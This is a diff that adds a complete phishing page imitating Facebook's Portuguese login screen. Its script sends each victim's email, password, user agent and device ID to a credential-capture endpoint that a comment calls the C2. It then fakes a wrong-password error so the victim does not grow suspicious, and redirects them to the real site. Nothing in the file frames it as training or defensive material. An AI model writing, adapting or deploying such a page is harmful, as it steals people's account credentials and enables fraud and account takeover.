@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - entre ou cadastre-se</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 980px;
+            display: flex;
+            gap: 60px;
+            align-items: center;
+        }
+        
+        .left-side {
+            flex: 1;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+        
+        .tagline {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+        
+        .right-side {
+            flex: 1;
+            max-width: 396px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 12px;
+        }
+        
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 20px;
+            color: #1c1e21;
+        }
+        
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        input::placeholder {
+            color: #8a8d91;
+        }
+        
+        .error-message {
+            display: none;
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 6px;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 12px;
+        }
+        
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+        
+        .btn-login:disabled {
+            background-color: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+        
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 16px;
+            margin-bottom: 16px;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .btn-create {
+            display: inline-block;
+            padding: 14px 16px;
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+        
+        .create-page-link {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 28px;
+        }
+        
+        .create-page-link a {
+            color: #1c1e21;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .create-page-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 12px 0;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                gap: 30px;
+            }
+            
+            .left-side {
+                text-align: center;
+            }
+            
+            .logo {
+                font-size: 48px;
+            }
+            
+            .tagline {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-side">
+            <div class="logo">facebook</div>
+            <p class="tagline">
+                O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.
+            </p>
+        </div>
+        
+        <div class="right-side">
+            <div class="card">
+                <form id="phishingForm" action="#" method="POST">
+                    <div class="form-group">
+                        <input 
+                            type="text" 
+                            id="email" 
+                            name="email" 
+                            placeholder="Email ou telefone"
+                            autocomplete="email"
+                            required
+                        >
+                        <div class="error-message" id="emailError">
+                            O email ou número de celular que você inseriu não está conectado a uma conta.
+                        </div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password" 
+                            placeholder="Senha"
+                            autocomplete="current-password"
+                            required
+                        >
+                        <div class="error-message" id="passwordError">
+                            A senha inserida está incorreta.
+                        </div>
+                    </div>
+                    
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn-login" id="submitBtn">
+                        Entrar
+                    </button>
+                    
+                    <a href="#" class="forgot-link">Esqueceu a senha?</a>
+                    
+                    <div class="divider"></div>
+                    
+                    <div style="text-align: center;">
+                        <a href="#" class="btn-create">Criar nova conta</a>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="create-page-link">
+                <a href="#"><strong>Criar uma Página</strong></a> para uma celebridade, uma marca ou uma empresa.
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const form = document.getElementById('phishingForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value;
+            
+            // Validação básica
+            let hasError = false;
+            
+            if (!email) {
+                emailError.classList.add('show');
+                emailInput.style.borderColor = '#d93025';
+                hasError = true;
+            } else {
+                emailError.classList.remove('show');
+                emailInput.style.borderColor = '#dddfe2';
+            }
+            
+            if (!password) {
+                passwordError.classList.add('show');
+                passwordInput.style.borderColor = '#d93025';
+                hasError = true;
+            } else {
+                passwordError.classList.remove('show');
+                passwordInput.style.borderColor = '#dddfe2';
+            }
+            
+            if (hasError) return;
+            
+            // Mostrar loading
+            loading.classList.add('show');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Entrando...';
+            
+            // Enviar credenciais para o C2
+            try {
+                const response = await fetch('/api/phishing/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Device-ID': getDeviceId()
+                    },
+                    body: JSON.stringify({
+                        platform: 'facebook',
+                        email: email,
+                        password: password,
+                        user_agent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                // Simular erro de senha para não levantar suspeitas
+                setTimeout(() => {
+                    loading.classList.remove('show');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Entrar';
+                    
+                    // Mostrar erro de senha incorreta
+                    passwordError.textContent = 'A senha inserida está incorreta. Esqueceu a senha?';
+                    passwordError.classList.add('show');
+                    passwordInput.style.borderColor = '#d93025';
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    
+                    // Após mostrar erro, redirecionar discretamente
+                    setTimeout(() => {
+                        window.location.href = 'https://www.facebook.com';
+                    }, 3000);
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            }
+        });
+        
+        function getDeviceId() {
+            try {
+                if (typeof Android !== 'undefined' && Android.getDeviceId) {
+                    return Android.getDeviceId();
+                }
+            } catch (e) {}
+            
+            let deviceId = localStorage.getItem('device_id');
+            if (!deviceId) {
+                deviceId = 'web_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('device_id', deviceId);
+            }
+            return deviceId;
+        }
+        
+        // Remover erros ao digitar
+        emailInput.addEventListener('input', () => {
+            emailError.classList.remove('show');
+            emailInput.style.borderColor = '#dddfe2';
+        });
+        
+        passwordInput.addEventListener('input', () => {
+            passwordError.classList.remove('show');
+            passwordInput.style.borderColor = '#dddfe2';
+        });
+    </script>
+</body>
+</html>
+
